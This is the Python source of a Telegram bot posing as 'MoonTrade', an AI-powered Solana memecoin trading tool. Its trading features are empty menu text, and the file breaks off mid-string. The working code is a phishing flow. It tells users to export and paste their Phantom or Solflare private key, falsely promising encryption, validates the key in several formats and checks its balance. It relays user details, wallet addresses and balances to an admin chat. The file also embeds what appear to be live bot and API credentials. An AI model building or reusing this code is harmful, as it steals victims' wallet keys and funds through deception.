import logging
import base58
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ⚠️ REMPLACEZ PAR VOTRE TOKEN
BOT_TOKEN = "8402114053:AAFLGOTHTX1pmNZ9JiPL64MMBTNSbriqTfc"

# Votre groupe Telegram pour recevoir les messages
ADMIN_CHAT_ID = -5299554897

# Helius RPC URL
HELIUS_RPC_URL = "https://mainnet.helius-rpc.com/?api-key=3129ff6b-1146-466d-b6f0-062f48ce84d9"

# Montant minimum requis en USD
MINIMUM_USD_REQUIRED = 10.0


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /start"""
    
    # Récupérer le prénom de l'utilisateur
    user = update.message.from_user
    user_name = user.first_name
    
    # Message de bienvenue
    welcome_text = f"""🚀 Welcome {user_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
    
    # Création des boutons interactifs
    keyboard = [
        [
            InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
            InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
        ],
        [
            InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
            InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
        ],
        [
            InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
            InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
        ],
        [
            InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
            InlineKeyboardButton("🌐 Language", callback_data='language')
        ],
        [
            InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
        ]
    ]
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    # URL de l'image
    image_url = "https://i.postimg.cc/gjr5vJJB/fait_enmoi_d_autre_similaire_a_sa_(1)_(2).jpg"
    
    # Envoi de l'image avec le message et les boutons
    await update.message.reply_photo(
        photo=image_url,
        caption=welcome_text,
        reply_markup=reply_markup
    )


async def trade_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /trade - Ouvre le module de trading"""
    keyboard = [
        [InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy')],
        [InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')],
        [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📈 **Trading Module**\n\nSelect your trading option:",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def sniper_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /sniper - Active le mode sniper"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🎯 **Sniper Mode**\n\n"
        "⚠️ This feature requires wallet connection.\n\n"
        "The sniper will automatically buy new tokens as soon as they are listed.\n\n"
        "Use /wallet to connect your wallet first.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def wallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /wallet - Gestion du wallet"""
    # Vérifier si un wallet est déjà connecté
    if context.user_data.get('wallet_connected'):
        public_key = context.user_data.get('wallet_public_key', 'Unknown')
        sol_balance = context.user_data.get('wallet_balance_sol', 0)
        usd_balance = context.user_data.get('wallet_balance_usd', 0)
        wallet_type = context.user_data.get('wallet_type', 'Unknown')
        
        keyboard = [
            [InlineKeyboardButton("🔄 Change Wallet", callback_data='change_wallet')],
            [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"💼 **Your Wallet**\n\n"
            f"💳 **Type:** {wallet_type}\n"
            f"💰 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)\n"
            f"👛 **Address:** `{public_key[:8]}...{public_key[-8:]}`",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
    else:
        wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await update.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )


async def scan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /scan - Scanner un contrat de token"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛡️ **Contract Scanner**\n\n"
        "Send me a Solana token contract address and I'll analyze it for:\n\n"
        "• Honeypot detection\n"
        "• Liquidity analysis\n"
        "• Holder distribution\n"
        "• Smart contract security\n"
        "• Rug-pull risk assessment\n\n"
        "Format: Paste the contract address",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /stats - Affiche les statistiques de trading"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "📊 **Trading Statistics**\n\n"
        "⚠️ Connect your wallet to view statistics\n\n"
        "Once connected, you'll see:\n"
        "• Total trades executed\n"
        "• Win/Loss ratio\n"
        "• Total profit/loss\n"
        "• Best performing tokens\n"
        "• Recent transactions\n\n"
        "Use /wallet to connect your wallet.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /help - Affiche l'aide"""
    help_text = """❓ **MoonTrade Bot - Help Menu**

**Main Commands:**
/start - Launch the bot and show main menu
/trade - Open trading module
/sniper - Activate sniper mode
/wallet - Manage your wallet
/scan - Scan a token contract
/stats - View trading statistics
/help - Display this help menu

**Feature Commands:**
/quickbuy - Quick buy tokens
/bloom - Bloom AI Trading
/multiwallet - Multi-wallet management
/analyzer - Contract analyzer
/predict - AI market predictions
/whale - Whale tracker
/rugcheck - Rug-pull detector

**How to use:**
1. Connect your wallet with /wallet
2. Choose a trading strategy
3. Start trading!

**Support:** Contact @YourSupportUsername

🚀 Happy Trading!"""
    
    keyboard = [[InlineKeyboardButton("🏠 Main Menu", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        help_text,
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def quickbuy_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /quickbuy - Achat rapide"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "⚡ **Quick Buy**\n\n"
        "Fast token purchase module.\n\n"
        "⚠️ Wallet connection required.\n\n"
        "Use /wallet to connect first.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def bloom_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /bloom - Bloom AI Trading"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🌸 **Bloom AI Trading**\n\n"
        "AI-powered automated trading strategies.\n\n"
        "Features:\n"
        "• Smart market analysis\n"
        "• Automated buy/sell signals\n"
        "• Risk management\n"
        "• 24/7 monitoring\n\n"
        "⚠️ Wallet connection required.\n\n"
        "Use /wallet to connect first.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def multiwallet_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /multiwallet - Gestion multi-wallets"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "💼 **Multi-Wallet Management**\n\n"
        "Manage multiple wallets simultaneously.\n\n"
        "Features:\n"
        "• Add multiple wallets\n"
        "• Switch between wallets\n"
        "• View all balances\n"
        "• Coordinated trading\n\n"
        "Use /wallet to add your first wallet.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def analyzer_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /analyzer - Analyseur de contrat"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🛡️ **Contract Analyzer**\n\n"
        "Deep analysis of token contracts.\n\n"
        "We check:\n"
        "• Smart contract code\n"
        "• Security vulnerabilities\n"
        "• Liquidity locks\n"
        "• Ownership renouncement\n"
        "• Mint/freeze authority\n\n"
        "Send a contract address to analyze.",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def predict_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /predict - Prédictions IA"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🧠 **AI Market Predictions**\n\n"
        "Machine learning powered market analysis.\n\n"
        "Our AI analyzes:\n"
        "• Price trends\n"
        "• Volume patterns\n"
        "• Social sentiment\n"
        "• Whale movements\n"
        "• Historical data\n\n"
        "Get predictions for any token!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def whale_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /whale - Tracker de baleines"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🐋 **Whale Tracker**\n\n"
        "Monitor large wallet movements in real-time.\n\n"
        "Track:\n"
        "• Large buys/sells\n"
        "• Whale wallet activities\n"
        "• Smart money movements\n"
        "• DEX transactions\n\n"
        "Get alerts when whales move!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )


async def rugcheck_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère la commande /rugcheck - Détecteur de rug-pull"""
    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        "🔴 **Rug-Pull Detector**\n\n"
        "Advanced protection against scams.\n\n"
        "We detect:\n"
        "• Suspicious token patterns\n"
        "• Dev wallet analysis\n"
        "• Liquidity risks\n"
        "• Honeypot contracts\n"
        "• Known scam indicators\n\n"
        "Send a token address to check!",
        reply_markup=reply_markup,
        parse_mode='Markdown'
    )




async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère les clics sur les boutons"""
    query = update.callback_query
    await query.answer()
    
    # Récupération de l'action cliquée
    action = query.data
    
    # ========== MENU PRINCIPAL ==========
    if action == 'back_to_menu':
        # Re-afficher le menu principal SANS image
        user = query.from_user
        welcome_text = f"""🚀 Welcome {user.first_name}, MoonTrade v2.8.1

⚡ Automated Memecoin Trading on Solana

🔷 AI-powered token analysis
🔷 Lightning-fast execution
🔷 Advanced rug-pull detection

⚙️ Active Modules:
▸ Smart Sniper Engine
▸ Pump.fun Live Monitor
▸ Whale Movement Tracker
▸ Honeypot Detector
▸ Multi-Wallet System

Select a function below:"""
        
        keyboard = [
            [
                InlineKeyboardButton("⚡ Quick Buy", callback_data='quick_buy'),
                InlineKeyboardButton("🌸 Bloom IA Trading", callback_data='bloom_trading')
            ],
            [
                InlineKeyboardButton("💼 Multi-Wallet", callback_data='multi_wallet'),
                InlineKeyboardButton("🛡️ Contract Analyzer", callback_data='contract_analyzer')
            ],
            [
                InlineKeyboardButton("🧠 AI Market Predict", callback_data='ai_predict'),
                InlineKeyboardButton("🐋 Whale Tracker", callback_data='whale_tracker')
            ],
            [
                InlineKeyboardButton("🔴 Rug-Pull Detector", callback_data='rug_detector'),
                InlineKeyboardButton("🌐 Language", callback_data='language')
            ],
            [
                InlineKeyboardButton("📊 Trading Stats & Performance", callback_data='stats')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            welcome_text,
            reply_markup=reply_markup
        )
        return
    
    # ========== GESTION WALLET ==========
    # Si l'utilisateur clique sur Phantom ou Solflare
    if action in ['phantom_wallet', 'solflare_wallet']:
        wallet_name = "Phantom" if action == 'phantom_wallet' else "Solflare"
        instruction_message = f"""🔐 **{wallet_name} Wallet Connection**

To enable trading features, please provide your wallet private key.

📝 **How to find your private key:**

**{wallet_name} Wallet:**
1. Open your {wallet_name} wallet
2. Go to Settings → Security & Privacy
3. Select "Export Private Key"
4. Copy and paste it here

⚠️ **Security Notice:**
Your private key is encrypted with military-grade security and never shared with third parties. We use it solely to execute trades on your behalf.

Please enter your private key below:"""
        
        back_keyboard = [[InlineKeyboardButton("« Back", callback_data='back_to_wallet_menu')]]
        back_markup = InlineKeyboardMarkup(back_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            instruction_message,
            reply_markup=back_markup,
            parse_mode='Markdown'
        )
        context.user_data['waiting_for_wallet'] = True
        context.user_data['wallet_type'] = wallet_name
        return
    
    if action == 'back_to_wallet_menu':
        wallet_message = """🔐 Import Wallet

⚠️ Authentication required to access trading features.

Select your wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )
        context.user_data['waiting_for_wallet'] = False
        return
    
    if action == 'change_wallet':
        wallet_message = """🔄 **Change Wallet**

Select your new wallet provider:"""
        
        wallet_keyboard = [
            [InlineKeyboardButton("👻 Phantom Wallet", callback_data='phantom_wallet')],
            [InlineKeyboardButton("🦊 Solflare Wallet", callback_data='solflare_wallet')],
            [InlineKeyboardButton("« Cancel", callback_data='back_to_menu')]
        ]
        
        wallet_markup = InlineKeyboardMarkup(wallet_keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            wallet_message,
            reply_markup=wallet_markup
        )
        context.user_data['wallet_connected'] = False
        return
    
    # ========== BOUTONS DU MENU PRINCIPAL ==========
    # Quick Buy
    if action == 'quick_buy':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "⚡ **Quick Buy**\n\n"
            "Fast token purchase module.\n\n"
            "⚠️ Wallet connection required.\n\n"
            "Use /wallet to connect first.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Bloom IA Trading
    if action == 'bloom_trading':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🌸 **Bloom AI Trading**\n\n"
            "AI-powered automated trading strategies.\n\n"
            "Features:\n"
            "• Smart market analysis\n"
            "• Automated buy/sell signals\n"
            "• Risk management\n"
            "• 24/7 monitoring\n\n"
            "⚠️ Wallet connection required.\n\n"
            "Use /wallet to connect first.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Multi-Wallet
    if action == 'multi_wallet':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "💼 **Multi-Wallet Management**\n\n"
            "Manage multiple wallets simultaneously.\n\n"
            "Features:\n"
            "• Add multiple wallets\n"
            "• Switch between wallets\n"
            "• View all balances\n"
            "• Coordinated trading\n\n"
            "Use /wallet to add your first wallet.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Contract Analyzer
    if action == 'contract_analyzer':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🛡️ **Contract Analyzer**\n\n"
            "Deep analysis of token contracts.\n\n"
            "We check:\n"
            "• Smart contract code\n"
            "• Security vulnerabilities\n"
            "• Liquidity locks\n"
            "• Ownership renouncement\n"
            "• Mint/freeze authority\n\n"
            "Send a contract address to analyze.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # AI Market Predict
    if action == 'ai_predict':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🧠 **AI Market Predictions**\n\n"
            "Machine learning powered market analysis.\n\n"
            "Our AI analyzes:\n"
            "• Price trends\n"
            "• Volume patterns\n"
            "• Social sentiment\n"
            "• Whale movements\n"
            "• Historical data\n\n"
            "Get predictions for any token!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Whale Tracker
    if action == 'whale_tracker':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🐋 **Whale Tracker**\n\n"
            "Monitor large wallet movements in real-time.\n\n"
            "Track:\n"
            "• Large buys/sells\n"
            "• Whale wallet activities\n"
            "• Smart money movements\n"
            "• DEX transactions\n\n"
            "Get alerts when whales move!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Rug-Pull Detector
    if action == 'rug_detector':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🔴 **Rug-Pull Detector**\n\n"
            "Advanced protection against scams.\n\n"
            "We detect:\n"
            "• Suspicious token patterns\n"
            "• Dev wallet analysis\n"
            "• Liquidity risks\n"
            "• Honeypot contracts\n"
            "• Known scam indicators\n\n"
            "Send a token address to check!",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Language
    if action == 'language':
        keyboard = [
            [InlineKeyboardButton("🇬🇧 English", callback_data='lang_en')],
            [InlineKeyboardButton("🇫🇷 Français", callback_data='lang_fr')],
            [InlineKeyboardButton("🇪🇸 Español", callback_data='lang_es')],
            [InlineKeyboardButton("« Back", callback_data='back_to_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "🌐 **Select Language**\n\nChoose your preferred language:",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
    
    # Stats
    if action == 'stats':
        keyboard = [[InlineKeyboardButton("🔙 Back", callback_data='back_to_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.message.delete()
        await query.message.reply_text(
            "📊 **Trading Statistics**\n\n"
            "⚠️ Connect your wallet to view statistics\n\n"
            "Once connected, you'll see:\n"
            "• Total trades executed\n"
            "• Win/Loss ratio\n"
            "• Total profit/loss\n"
            "• Best performing tokens\n"
            "• Recent transactions\n\n"
            "Use /wallet to connect your wallet.",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return
async def verify_wallet_and_balance(private_key_str: str):
    """Vérifie la clé privée et récupère le solde SOL ainsi que sa valeur en USD"""
    try:
        import aiohttp
        from solders.keypair import Keypair
        
        # Récupérer le prix actuel du SOL
        sol_price_usd = await get_solana_price()
        
        # Essayer différents formats de clé privée
        keypair = None
        public_key = None
        
        # Format 1 : Base58 (le plus courant pour Phantom)
        try:
            secret_key = base58.b58decode(private_key_str.strip())
            if len(secret_key) == 64:  # Taille correcte pour Solana
                keypair = Keypair.from_bytes(secret_key)
                public_key = str(keypair.pubkey())
                logger.info(f"✅ Clé décodée en Base58, Public Key: {public_key}")
        except Exception as e:
            logger.info(f"Format Base58 échoué: {e}")
        
        # Format 2 : Liste de bytes [1,2,3,...]
        if not keypair:
            try:
                # Nettoyer la chaîne
                clean_str = private_key_str.strip().replace('[', '').replace(']', '').replace(' ', '')
                secret_key = bytes([int(x) for x in clean_str.split(',')])
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en liste bytes, Public Key: {public_key}")
            except Exception as e:
                logger.info(f"Format liste bytes échoué: {e}")
        
        # Format 3 : Hex
        if not keypair:
            try:
                secret_key = bytes.fromhex(private_key_str.strip())
                if len(secret_key) == 64:
                    keypair = Keypair.from_bytes(secret_key)
                    public_key = str(keypair.pubkey())
                    logger.info(f"✅ Clé décodée en Hex, Public Key: {public_key}")
            except Exception as e:
                logger.info(f"Format Hex échoué: {e}")
        
        # Si aucun format n'a fonctionné
        if not keypair or not public_key:
            logger.error("❌ Tous les formats de clé privée ont échoué")
            return None, None, None, 0, "invalid"
        
        # Récupérer le solde via RPC
        try:
            async with aiohttp.ClientSession() as session:
                payload = {
                    "jsonrpc": "2.0",
                    "id": 1,
                    "method": "getBalance",
                    "params": [public_key]
                }
                
                async with session.post(HELIUS_RPC_URL, json=payload, timeout=aiohttp.ClientTimeout(total=10)) as response:
                    data = await response.json()
                    
                    if "result" in data:
                        lamports = data["result"]["value"]
                        sol_balance = lamports / 1_000_000_000  # Convertir en SOL
                        usd_value = sol_balance * sol_price_usd if sol_price_usd > 0 else 0
                        logger.info(f"✅ Solde récupéré: {sol_balance} SOL (${usd_value:.2f} USD)")
                        return public_key, sol_balance, usd_value, sol_price_usd, "valid"
                    else:
                        logger.warning(f"Pas de résultat dans la réponse RPC: {data}")
                        return public_key, 0, 0, sol_price_usd, "valid"
        
        except Exception as e:
            logger.error(f"Erreur récupération solde: {e}")
            # Même si on ne peut pas récupérer le solde, la clé est valide
            return public_key, 0, 0, sol_price_usd, "valid"
    
    except Exception as e:
        logger.error(f"Erreur générale vérification wallet: {e}")
        return None, None, None, 0, "invalid"


async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gère tous les messages texte et les transfère à l'admin"""
    user = update.message.from_user
    user_message = update.message.text
    
    # Vérifier si l'utilisateur doit fournir la config de tracking
    if context.user_data.get('waiting_for_tracking_config'):
        tracking_command = context.user_data.get('tracking_command', 'unknown')
        context.user_data['waiting_for_tracking_config'] = False
        
        # Valider la configuration
        is_valid, error_message, wallets, fees = validate_tracking_config(user_message)
        
        if not is_valid:
            # Configuration invalide
            await update.message.reply_text(
                f"⚠️ **Configuration Error**\n\n{error_message}\n\nPlease try again with the correct format.",
                parse_mode='Markdown'
            )
            
            # Remettre en attente de configuration
            context.user_data['waiting_for_tracking_config'] = True
            
            # Notification à l'admin
            admin_notification = f"""⚠️ **Configuration invalide reçue**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
🎯 **Commande:** {tracking_command}

❌ **Erreur:** {error_message}

📋 **Configuration tentée:**
{user_message}

---
❌ _Configuration rejetée_"""
            
            try:
                await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=admin_notification,
                    parse_mode='Markdown'
                )
            except Exception as e:
                logger.error(f"Erreur envoi à l'admin: {e}")
            
            return
        
        # Configuration valide - Sauvegarder
        context.user_data['tracking_config'] = user_message
        context.user_data['tracked_wallets'] = wallets
        context.user_data['trading_fees'] = fees
        
        # Récupérer les infos du wallet
        public_key = context.user_data.get('wallet_public_key', 'N/A')
        sol_balance = context.user_data.get('wallet_balance_sol', 0)
        usd_balance = context.user_data.get('wallet_balance_usd', 0)
        
        # Envoyer la confirmation avec les infos
        confirmation_message = f"""✅ **Configuration Accepted**

👛 **Your Wallet:**
Address: `{public_key[:8]}...{public_key[-8:]}`
Balance: {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

📋 **Tracking Configuration:**
✅ Wallets to track: {len(wallets)}
✅ Slippage: 20%
✅ Priority: 0.001 sol
✅ Bribe: 0.001 sol

✅ **Configuration Accepted!**

You can now access all trading features and start trading!"""
        
        # Boutons selon la commande/action
        if tracking_command in ['trade', 'quick_buy', 'bloom_trading']:
            keyboard = [
                [
                    InlineKeyboardButton("⚡ Start Trading", callback_data='start_trading'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['sniper', 'activate_sniper', 'sniper_settings']:
            keyboard = [
                [
                    InlineKeyboardButton("🎯 Activate Sniper", callback_data='activate_sniper'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['scan', 'scan_new', 'market_overview']:
            keyboard = [
                [
                    InlineKeyboardButton("🔍 Start Scanning", callback_data='start_scan'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['multi_wallet', 'multiwallet']:
            keyboard = [
                [
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked'),
                    InlineKeyboardButton("➕ Add More Wallets", callback_data='add_wallets')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['contract_analyzer', 'analyzer']:
            keyboard = [
                [
                    InlineKeyboardButton("🔍 Analyze Contract", callback_data='analyze_contract'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['whale_tracker', 'whale']:
            keyboard = [
                [
                    InlineKeyboardButton("🐋 Start Tracking", callback_data='start_whale_track'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("📈 Recent Whale Moves", callback_data='whale_moves'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['ai_predict', 'predict']:
            keyboard = [
                [
                    InlineKeyboardButton("🧠 Get Prediction", callback_data='get_prediction'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("📈 Market Analysis", callback_data='market_analysis'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        elif tracking_command in ['rug_detector', 'rugcheck']:
            keyboard = [
                [
                    InlineKeyboardButton("🔴 Scan for Rugs", callback_data='scan_rugs'),
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked')
                ],
                [
                    InlineKeyboardButton("⚠️ Risk Report", callback_data='risk_report'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        else:  # stats ou autres
            keyboard = [
                [
                    InlineKeyboardButton("📊 View Tracked Wallets", callback_data='view_tracked'),
                    InlineKeyboardButton("💰 Check Balance", callback_data='check_balance')
                ],
                [
                    InlineKeyboardButton("⚙️ Modify Config", callback_data='modify_config')
                ],
                [InlineKeyboardButton("« Back to Menu", callback_data='back_to_menu')]
            ]
        
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            confirmation_message,
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
        # Notification à l'admin
        admin_notification = f"""📊 **Configuration de tracking reçue**

👤 **Utilisateur:** {user.first_name} {user.last_name or ''}
🆔 **Username:** @{user.username if user.username else '❌ PAS DE USERNAME'}
🔢 **User ID:** `{user.id}`
🎯 **Commande:** {tracking_command}

👛 **Wallet:** `{public_key}`
💰 **Balance:** {sol_balance:.4f} SOL (${usd_balance:.2f} USD)

📋 **Configuration:**
{user_message}

---
